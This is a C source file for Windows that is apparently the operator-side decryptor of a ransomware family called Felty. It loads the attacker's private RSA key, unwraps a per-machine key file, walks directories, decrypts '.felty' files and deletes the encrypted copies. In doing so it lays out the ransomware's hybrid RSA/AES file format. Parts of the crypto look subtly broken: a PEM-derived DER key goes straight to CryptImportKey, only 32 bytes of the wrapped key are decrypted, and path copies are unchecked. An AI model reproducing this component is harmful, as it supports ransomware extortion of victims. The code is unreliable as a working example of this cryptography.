/*
 * felty_decrypt.c - Decrypt files encrypted by Felty ransomware
 *
 * BUILD:
 *   x86_64-w64-mingw32-gcc -Os -s -Wall -o felty_decrypt.exe felty_decrypt.c -lcrypt32 -ladvapi32
 *   strip --strip-all felty_decrypt.exe
 *
 * USAGE:
 *   felty_decrypt.exe attacker_private.pem C:\target\directory
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#define AES_KEY_SIZE    32
#define AES_BLOCK_SIZE  16
#define ENC_EXT         L".felty"

HCRYPTPROV g_prov = 0;

static int read_file(const wchar_t *path, BYTE **out, DWORD *out_len) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(h); return 0; }
    *out = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!*out) { CloseHandle(h); return 0; }
    DWORD read = 0;
    if (!ReadFile(h, *out, size, &read, NULL) || read != size) {
        VirtualFree(*out, 0, MEM_RELEASE);
        CloseHandle(h);
        return 0;
    }
    CloseHandle(h);
    *out_len = size;
    return 1;
}

static int write_file(const wchar_t *path, BYTE *data, DWORD len) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD written = 0;
    int ret = WriteFile(h, data, len, &written, NULL) && written == len;
    CloseHandle(h);
    return ret;
}

static HCRYPTKEY import_private_key_pem(const wchar_t *pem_path) {
    BYTE *pem_data = NULL;
    DWORD pem_len = 0;
    if (!read_file(pem_path, &pem_data, &pem_len)) return 0;

    char *pem_a = (char*)pem_data;
    char *b64_start = strstr(pem_a, "-----BEGIN");
    if (!b64_start) { VirtualFree(pem_data, 0, MEM_RELEASE); return 0; }
    b64_start = strchr(b64_start, '\n');
    if (!b64_start) { VirtualFree(pem_data, 0, MEM_RELEASE); return 0; }
    b64_start++;

    BYTE der_buf[8192];
    DWORD der_len = sizeof(der_buf);
    if (!CryptStringToBinaryA(b64_start, 0, CRYPT_STRING_BASE64,
                              der_buf, &der_len, NULL, NULL)) {
        VirtualFree(pem_data, 0, MEM_RELEASE);
        return 0;
    }
    VirtualFree(pem_data, 0, MEM_RELEASE);

    HCRYPTKEY hkey = 0;
    if (!CryptImportKey(g_prov, der_buf, der_len, 0, 0, &hkey)) return 0;
    return hkey;
}

static int decrypt_one_file(const wchar_t *path, HCRYPTKEY victim_key) {
    BYTE *data = NULL;
    DWORD size = 0;
    if (!read_file(path, &data, &size)) return 0;
    if (size < 20) { VirtualFree(data, 0, MEM_RELEASE); return 0; }

    DWORD off = 0;
    DWORD key_len = *(DWORD*)(data + off); off += 4;
    if (off + key_len + 16 > size) { VirtualFree(data, 0, MEM_RELEASE); return 0; }
    BYTE *enc_aes = data + off; off += key_len;
    BYTE *iv = data + off; off += 16;
    BYTE *ct = data + off;
    DWORD ct_len = size - off;

    DWORD aes_len = AES_KEY_SIZE;
    BYTE aes_key[AES_KEY_SIZE];
    memcpy(aes_key, enc_aes, AES_KEY_SIZE);
    if (!CryptDecrypt(victim_key, 0, TRUE, 0, aes_key, &aes_len)) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }

    struct {
        BLOBHEADER hdr;
        DWORD len;
        BYTE key[AES_KEY_SIZE];
    } aes_blob;
    aes_blob.hdr.bType = PLAINTEXTKEYBLOB;
    aes_blob.hdr.bVersion = CUR_BLOB_VERSION;
    aes_blob.hdr.reserved = 0;
    aes_blob.hdr.aiKeyAlg = CALG_AES_256;
    aes_blob.len = AES_KEY_SIZE;
    memcpy(aes_blob.key, aes_key, AES_KEY_SIZE);

    HCRYPTKEY aes_handle = 0;
    if (!CryptImportKey(g_prov, (BYTE*)&aes_blob, sizeof(aes_blob), 0, 0, &aes_handle)) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }

    CryptSetKeyParam(aes_handle, KP_IV, iv, 0);
    DWORD pt_len = ct_len;
    if (!CryptDecrypt(aes_handle, 0, TRUE, 0, ct, &pt_len)) {
        CryptDestroyKey(aes_handle);
        VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }
    CryptDestroyKey(aes_handle);

    BYTE pad = ct[pt_len - 1];
    if (pad && pad <= AES_BLOCK_SIZE) pt_len -= pad;

    wchar_t out_path[MAX_PATH];
    wcscpy(out_path, path);
    size_t plen = wcslen(out_path);
    if (plen >= 6) out_path[plen - 6] = 0;

    if (!write_file(out_path, ct, pt_len)) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }

    DeleteFileW(path);
    VirtualFree(data, 0, MEM_RELEASE);
    return 1;
}

static void walk_and_decrypt(const wchar_t *dir, HCRYPTKEY victim_key, int *count) {
    wchar_t search[MAX_PATH];
    wcscpy(search, dir);
    wcscat(search, L"\\*");

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(search, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.cFileName[0] == L'.') continue;
            if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
            wchar_t sub[MAX_PATH];
            wcscpy(sub, dir);
            wcscat(sub, L"\\");
            wcscat(sub, fd.cFileName);
            walk_and_decrypt(sub, victim_key, count);
        } else {
            const wchar_t *ext = wcsrchr(fd.cFileName, L'.');
            if (ext && !_wcsicmp(ext, ENC_EXT)) {
                wchar_t fpath[MAX_PATH];
                wcscpy(fpath, dir);
                wcscat(fpath, L"\\");
                wcscat(fpath, fd.cFileName);
                wprintf(L"[%d] Decrypting: %s\n", *count + 1, fpath);
                if (decrypt_one_file(fpath, victim_key)) {
                    (*count)++;
                    wprintf(L"OK\n");
                } else {
                    wprintf(L"FAILED\n");
                }
            }
        }
    } while (FindNextFileW(hf, &fd));
    FindClose(hf);
}

int wmain(int argc, wchar_t *argv[]) {
    if (argc < 3) {
        wprintf(L"Usage: felty_decrypt.exe <attacker_private.pem> <directory>\n");
        return 1;
    }

    if (!CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0)) {
        wprintf(L"Failed to acquire crypto context\n");
        return 1;
    }

    HCRYPTKEY attacker_key = import_private_key_pem(argv[1]);
    if (!attacker_key) {
        wprintf(L"Failed to import private key from: %s\n", argv[1]);
        CryptReleaseContext(g_prov, 0);
        return 1;
    }
    wprintf(L"[+] Imported attacker private key\n");

    wchar_t eky_path[MAX_PATH];
    wcscpy(eky_path, argv[2]);
    size_t dlen = wcslen(eky_path);
    if (dlen > 0 && eky_path[dlen - 1] == L'\\') eky_path[dlen - 1] = 0;
    wcscat(eky_path, L"\\machine.eky");

    HCRYPTKEY victim_key = 0;
    BYTE *eky_data = NULL;
    DWORD eky_len = 0;
    if (read_file(eky_path, &eky_data, &eky_len)) {
        if (CryptImportKey(g_prov, eky_data, eky_len, attacker_key, 0, &victim_key)) {
            wprintf(L"[+] Loaded and decrypted machine.eky\n");
        }
        VirtualFree(eky_data, 0, MEM_RELEASE);
    }

    if (!victim_key) {
        wprintf(L"[-] No machine.eky found. Using attacker key directly...\n");
        victim_key = attacker_key;
    }

    int count = 0;
    wprintf(L"[*] Scanning: %s\n", argv[2]);
    walk_and_decrypt(argv[2], victim_key, &count);

    wprintf(L"\n[+] Decryption complete: %d files restored.\n", count);

    if (victim_key != attacker_key)
        CryptDestroyKey(victim_key);
    CryptDestroyKey(attacker_key);
    CryptReleaseContext(g_prov, 0);
    return 0;
}